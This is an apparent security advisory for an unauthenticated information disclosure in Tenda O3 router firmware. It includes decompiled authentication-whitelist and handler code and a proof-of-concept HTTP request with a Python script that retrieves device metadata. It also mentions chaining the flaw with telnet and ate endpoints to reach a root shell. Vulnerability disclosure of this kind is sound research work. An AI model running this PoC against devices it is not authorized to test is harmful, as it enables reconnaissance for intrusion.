## Tenda O3 httpd formLogInfoGet function unauthenticated information disclosure vulnerability

### Product Information

```
Brand: Tenda
Model: O3
Firmware Version: V1.0.0.10
Official Website: https://www.tenda.com.cn
Firmware Download URL: https://www.tendacn.com/material/show/102892
```

### Affected Component

```
The formLogInfoGet function (action name: getLoginInfo, address 0x0046E948) in httpd
```

### Suggested description of the vulnerability

```
Tenda O3 V1.0.0.10 httpd formLogInfoGet function has an unauthenticated information
disclosure vulnerability.
```

### Vulnerability Details

This firmware (Tenda O3, a heavily customized GoAhead 3.3.0) centralizes its authentication in the `authSecurityHandler` function (0x00492598), which runs before every route dispatch (`websRouteRequest` at 0x0042E610: `if ( authSecurityHandler(a1) )`). It maintains a source-IP login tracking table `loginUserInfo[10]`; any URL matching its whitelist is allowed by returning `1`, while everything else is redirected to the login page.

`/goform/getLoginInfo` is unconditionally included in that unauthenticated whitelist:

```c
// Whitelist check in authSecurityHandler (0x00492598)
if ( !strcmp(v14, "/favicon.ico")
  || !strncmp(v14, "/goform/ate", 0x100u)
  || !strncmp(v14, "/ate.htm", 0x100u)
  || !strncmp(v14, "/goform/usbTest", 0x100u)
  || !strncmp(v14, "/lang", 0x100u)
  || !strncmp(v14, "/goform/getAdStatistics", 0x100u)
  || !strncmp(v14, "/disable.asp", 0x100u)
  || !strncmp(byte_4F28D0, &byte_4F39D4, 0x80u) && !strncmp(v14, "/goform/telnet", 0x100u)
  || !strncmp(v14, "/goform/getLoginInfo", 0x100u)   // <- /goform/getLoginInfo unauthenticated
  || !byte_4F39D4 && !strncmp(v14, "/goform/initAdminUser", 0x100u)
  || !strncmp(v14, "/preTimeout.asp", 0x100u)
  || !strncmp(v14, "/timeout.asp", 0x100u)
  || !strncmp(v14, "/goform/getPreTimeoutNotify", 0x100u)
  || !strncmp(v14, "/goform/getTimeoutNotify", 0x100u)
  || !strncmp(v14, "/goform/ackPreTimeoutNotify", 0x100u) )
{
  return 1;   // <- allowed directly; no login-state / session check at all
}
```

The action `getLoginInfo` is dispatched by `actionHandler` (0x004061E0) to `formLogInfoGet` (0x0046E948). That handler reads several device configuration values from NVRAM and returns them in a JSON response without performing any authentication of its own:

```c
void __fastcall formLogInfoGet(int *a1)
{
  ...
  Object = (void **)cJSON_CreateObject();
  GetValue("sys.username", v7);
  GetValue("sys.userpass", v8);
  GetValue("wl.country_code", v9);
  GetValue("sys.targets", v10);
  if ( v7[0] )
    String = cJSON_CreateString("1");
  else
    String = cJSON_CreateString("0");
  cJSON_AddItemToObject((int)Object, "hasUser", (int)String);  // discloses whether admin username is set
  vos_strcmp(v8, "YWRtaW4=");                                  // result discarded (not returned)
  v2 = cJSON_CreateString("1");
  cJSON_AddItemToObject((int)Object, "encode", (int)v2);       // constant "1"
  v3 = cJSON_CreateString((const char *)v9);
  cJSON_AddItemToObject((int)Object, "country", (int)v3);      // discloses country code
  v4 = cJSON_CreateString(v10);
  cJSON_AddItemToObject((int)Object, "apname", (int)v4);       // discloses device name (sys.targets)
  v5 = cJSON_Object_2String(Object);
  websTransfer(a1, v5);                                        // <- response (information disclosure)
}
```

The disclosed fields are device configuration values read directly from NVRAM:

- `hasUser` — whether the administrator username (`sys.username`) has been configured ("1" or "0").
- `country` — the configured region code (`wl.country_code`, e.g. "CN").
- `apname` — the device name (`sys.targets`).
- `encode` — a constant "1".

Note that although `sys.userpass` (the administrator password, stored base64-encoded) is read into `v8`, it is only compared against the literal `"YWRtaW4="` (base64 of "admin") and the comparison result is discarded; the password itself is **not** included in the JSON response. Therefore the disclosure is limited to device identity/configuration metadata (`hasUser`, `country`, `apname`).

The complete data flow is as follows:

```
GET /goform/getLoginInfo   (no authentication required, no request parameters)
    └── websRouteRequest()                        [0x0042E610]  route dispatch entry
        └── authSecurityHandler()                 [0x00492598]  authentication gate
            └── strncmp(urlbuf, "/goform/getLoginInfo") matches whitelist -> return 1 (allowed without auth)
        └── actionHandler()                       [0x004061E0]  /goform action dispatch
            └── formLogInfoGet(wp)                [0x0046E948]
                └── GetValue("sys.username", v7)                -> disclosed as "hasUser"
                └── GetValue("sys.userpass", v8)               -> read, but NOT returned
                └── GetValue("wl.country_code", v9)            -> disclosed as "country"
                └── GetValue("sys.targets", v10)               -> disclosed as "apname"
                └── cJSON_Object_2String(Object) + websTransfer(wp, out)  -> response (information disclosure)
```

The involved check functions are as follows:

```
- authSecurityHandler(): the authentication gate that should block unauthenticated requests,
  but it unconditionally whitelists /goform/getLoginInfo and returns 1 (allowed) before any
  login-state check, which is the root cause of the vulnerability.
- formLogInfoGet(): performs no authentication/authorization of its own; it directly returns
  NVRAM configuration values (hasUser / country / apname) to the requester.
```

### Attack

An unauthenticated remote attacker can issue a plain `GET /goform/getLoginInfo` request without any cookie, token or credentials. The device responds with a JSON object revealing device configuration metadata: whether an administrator username has been set (`hasUser`), the configured region (`country`), and the device name (`apname`). This information can be used for device fingerprinting and as a preliminary reconnaissance step in a larger attack chain (for example, combined with the unauthenticated `/goform/telnet` and `/goform/ate` command-execution flaws to obtain a root shell).

### PoC

This is an unauthenticated (pre-authentication) vulnerability; no Token / Cookie is required.

Request:

```http
GET /goform/getLoginInfo HTTP/1.1
Host: 192.168.31.6
```

response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"hasUser":"1","encode":"1","country":"CN","apname":"Tenda_O3"}
```

Equivalent Python PoC:

```python
import requests

BASE_URL = "http://192.168.31.6"

resp = requests.request(
    method="GET",
    url=BASE_URL + "/goform/getLoginInfo",
    headers={"Host": "192.168.31.6"},
    data=None,
    timeout=10,
    verify=False,
)

print("URL:", resp.url)
print("Status code:", resp.status_code)
print("Response headers:", dict(resp.headers))
print("Response body:", resp.text)
```

### Discoverer

Zippy
